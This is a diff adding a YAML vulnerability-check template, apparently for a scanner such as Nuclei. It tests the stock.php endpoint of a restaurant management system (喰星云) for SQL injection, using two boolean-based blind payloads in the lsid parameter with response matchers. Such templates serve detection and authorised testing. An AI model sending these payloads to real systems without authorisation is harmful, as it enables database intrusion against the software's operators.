@@ -1,0 +1,42 @@
+id: poc-yaml-can-xing-yun-stock-php-sqli
+info:
+  name: 喰星云-数字化餐饮服务系统 stock.php SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - raw:
+      - |
+        GET /logistics/home_warning/php/stock.php?do=getList&lsid=(SELECT+(CASE+WHEN+(6193=6193)+THEN+%27%27+ELSE+(SELECT+9641+UNION+SELECT+2384)+END)) HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"success":true'
+          - '"total":'
+        condition: and
+      - type: word
+        words:
+          - "<"
+        negative: true
+
+  - raw:
+      - |
+        GET /logistics/home_warning/php/stock.php?do=getList&lsid=(SELECT+(CASE+WHEN+(6191=6193)+THEN+%27%27+ELSE+(SELECT+9641+UNION+SELECT+2384)+END)) HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "数据库查询出错"
+          - "DBException"
+        condition: and
+      - type: word
+        words:
+          - '"success":false'
+          - "服务器内部错误"
+        condition: and
